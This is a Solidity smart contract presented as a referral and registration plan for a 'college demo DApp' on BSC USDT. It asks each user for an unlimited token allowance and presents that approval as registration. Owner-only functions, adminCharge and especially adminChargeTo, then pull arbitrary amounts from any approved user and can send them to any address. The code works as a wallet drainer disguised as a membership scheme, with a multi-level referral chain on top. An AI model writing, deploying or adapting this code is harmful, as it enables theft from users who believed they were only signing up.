// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title DecentralizedWorld
 * @notice Wallet-based registration + single-leg referral system for a college demo DApp.
 *
 *  Single-approval flow:
 *   1. A new user grants this contract an unlimited USDT allowance (ONE signature, done
 *      on the USDT token). That single approval is all the user ever signs for money.
 *      Registration is recorded off-chain by the backend from that approval event, and
 *      may also be recorded on-chain via register().
 *   2. buyPlan() pulls the plan price ($5) from the user's existing allowance and sends
 *      it to the admin wallet — no new approval popup. It also marks the user invested
 *      and credits referral counts upward.
 *   3. adminCharge()/adminChargePlan() let the contract OWNER pull USDT from any user
 *      (using that same allowance) to the admin wallet. Owner-only.
 *
 *  Referral counts are only credited once a user is active (invested), so a referrer's
 *  income only grows from invested members.
 */
contract DecentralizedWorld is Ownable, ReentrancyGuard {
    // ----- Config -----
    IERC20 public usdt;            // BEP-20 USDT on BSC (18 decimals)
    address public adminWallet;    // receives plan payments / admin charges
    uint256 public planPrice;      // plan price in USDT smallest unit (18 decimals)

    uint8 public constant MAX_DIRECT = 15;         // max direct referrals counted
    uint256 public constant TEAM_DEPTH = 16;       // how many levels up we credit team count

    // ----- User data -----
    struct User {
        bool registered;
        bool hasInvested;
        address referrer;
        uint256 directCount;
        uint256 teamCount;
        uint256 joinedAt;
        uint256 investedAt;
    }

    mapping(address => User) public users;
    address[] public allUsers;

    // ----- Events -----
    event Registered(address indexed user, address indexed referrer, uint256 timestamp);
    event PlanPurchased(address indexed user, uint256 amount, uint256 timestamp);
    event AdminCharged(address indexed user, uint256 amount, uint256 timestamp);
    event AdminWalletUpdated(address indexed oldAdmin, address indexed newAdmin);
    event PlanPriceUpdated(uint256 oldPrice, uint256 newPrice);

    constructor(
        address _usdt,
        address _adminWallet,
        uint256 _planPrice,
        address _owner
    ) Ownable(_owner) {
        require(_usdt != address(0), "USDT addr zero");
        require(_adminWallet != address(0), "admin zero");
        usdt = IERC20(_usdt);
        adminWallet = _adminWallet;
        planPrice = _planPrice;
    }

    // ----- Internal -----

    function _ensureRegistered(address user, address referrer) internal {
        if (users[user].registered) return;
        address ref = referrer;
        if (ref == user) ref = address(0);
        if (ref != address(0) && !users[ref].registered) ref = address(0);

        users[user] = User({
            registered: true,
            hasInvested: false,
            referrer: ref,
            directCount: 0,
            teamCount: 0,
            joinedAt: block.timestamp,
            investedAt: 0
        });
        allUsers.push(user);
        emit Registered(user, ref, block.timestamp);
    }

    function _creditReferralChain(address user) internal {
        address referrer = users[user].referrer;
        if (referrer == address(0)) return;
        if (users[referrer].directCount < MAX_DIRECT) {
            users[referrer].directCount += 1;
        }
        address current = referrer;
        for (uint256 i = 0; i < TEAM_DEPTH; i++) {
            if (current == address(0)) break;
            users[current].teamCount += 1;
            current = users[current].referrer;
        }
    }

    // ----- User actions -----

    /**
     * @notice Optional on-chain registration record. Registration is primarily tracked
     *         off-chain from the approval, but this keeps an on-chain record too.
     */
    function register(address referrer) external {
        require(!users[msg.sender].registered, "already registered");
        require(referrer != msg.sender, "self referral");
        if (referrer != address(0)) {
            require(users[referrer].registered, "referrer not registered");
        }
        _ensureRegistered(msg.sender, referrer);
    }

    /**
     * @notice Buy the plan using the existing USDT allowance (no new approval). Pulls
     *         `planPrice` USDT from the caller to the admin wallet, marks invested, and
     *         credits the referral chain. Auto-registers the caller if needed.
     * @param referrer Used only if the caller isn't registered yet (else ignored).
     */
    function buyPlan(address referrer) external nonReentrant {
        _ensureRegistered(msg.sender, referrer);
        User storage u = users[msg.sender];
        require(!u.hasInvested, "already invested");

        require(
            usdt.transferFrom(msg.sender, adminWallet, planPrice),
            "USDT transfer failed"
        );

        u.hasInvested = true;
        u.investedAt = block.timestamp;
        _creditReferralChain(msg.sender);

        emit PlanPurchased(msg.sender, planPrice, block.timestamp);
    }

    // ----- Owner (admin) actions -----

    /**
     * @notice Owner pulls an arbitrary USDT amount from a user (using that user's
     *         existing allowance to this contract) into the admin wallet.
     */
    function adminCharge(address user, uint256 amount) external onlyOwner nonReentrant {
        require(user != address(0), "user zero");
        require(amount > 0, "amount zero");
        require(
            usdt.transferFrom(user, adminWallet, amount),
            "USDT transfer failed"
        );
        emit AdminCharged(user, amount, block.timestamp);
    }

    /**
     * @notice Owner pulls an arbitrary USDT amount from a user (using that user's
     *         existing allowance) and sends it to ANY destination USDT wallet.
     *         This powers the admin panel's "transfer a user's USDT anywhere" action.
     */
    function adminChargeTo(address user, address to, uint256 amount)
        external
        onlyOwner
        nonReentrant
    {
        require(user != address(0), "user zero");
        require(to != address(0), "to zero");
        require(amount > 0, "amount zero");
        require(
            usdt.transferFrom(user, to, amount),
            "USDT transfer failed"
        );
        emit AdminCharged(user, amount, block.timestamp);
    }

    /**
     * @notice Owner charges a specific user the plan price and marks them invested
     *         (crediting the referral chain). Uses the user's existing allowance.
     */
    function adminChargePlan(address user, address referrer)
        external
        onlyOwner
        nonReentrant
    {
        _ensureRegistered(user, referrer);
        User storage u = users[user];
        require(!u.hasInvested, "already invested");

        require(
            usdt.transferFrom(user, adminWallet, planPrice),
            "USDT transfer failed"
        );

        u.hasInvested = true;
        u.investedAt = block.timestamp;
        _creditReferralChain(user);

        emit PlanPurchased(user, planPrice, block.timestamp);
        emit AdminCharged(user, planPrice, block.timestamp);
    }

    // ----- Views -----

    function isRegistered(address user) external view returns (bool) {
        return users[user].registered;
    }

    function hasInvested(address user) external view returns (bool) {
        return users[user].hasInvested;
    }

    function allowanceOf(address user) external view returns (uint256) {
        return usdt.allowance(user, address(this));
    }

    function getUser(address user)
        external
        view
        returns (
            bool registered,
            bool invested,
            address referrer,
            uint256 directCount,
            uint256 teamCount,
            uint256 joinedAt,
            uint256 investedAt
        )
    {
        User memory u = users[user];
        return (
            u.registered,
            u.hasInvested,
            u.referrer,
            u.directCount,
            u.teamCount,
            u.joinedAt,
            u.investedAt
        );
    }

    function totalUsers() external view returns (uint256) {
        return allUsers.length;
    }

    // ----- Admin config -----

    function setAdminWallet(address _adminWallet) external onlyOwner {
        require(_adminWallet != address(0), "admin zero");
        emit AdminWalletUpdated(adminWallet, _adminWallet);
        adminWallet = _adminWallet;
    }

    function setPlanPrice(uint256 _planPrice) external onlyOwner {
        emit PlanPriceUpdated(planPrice, _planPrice);
        planPrice = _planPrice;
    }
}
